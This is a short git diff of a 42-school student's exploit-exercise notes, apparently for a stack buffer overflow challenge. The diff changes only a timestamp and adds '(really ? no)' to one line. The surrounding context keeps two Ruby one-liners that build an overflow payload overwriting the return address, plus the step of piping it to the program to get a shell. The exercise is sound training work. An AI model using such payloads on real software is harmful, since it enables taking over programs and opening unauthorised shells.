@@ -6,7 +6,7 @@
 #    By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2021/04/23 19:15:34 by fcadet            #+#    #+#              #
-#    Updated: 2021/04/23 20:05:23 by fcadet           ###   ########.fr        #
+#    Updated: 2021/04/23 22:46:23 by fcadet           ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -18,7 +18,7 @@
 - next we can have 8 bytes of stack alignment or not
 - then 4 bytes for saved ebp
 - finaly we found the main return address
-- so there is two possible commands :
+- so there is two possible commands : (really ? no)
 	- ruby -e 'print "x" * (64 + 4) + "\x44\x84\x04\x08"' > /tmp/exploit
 	- ruby -e 'print "x" * (64 + 8 + 4) + "\x44\x84\x04\x08"' > /tmp/exploit
 - we can now feed our program stdin with /tmp/exploit and keep sh open with cat
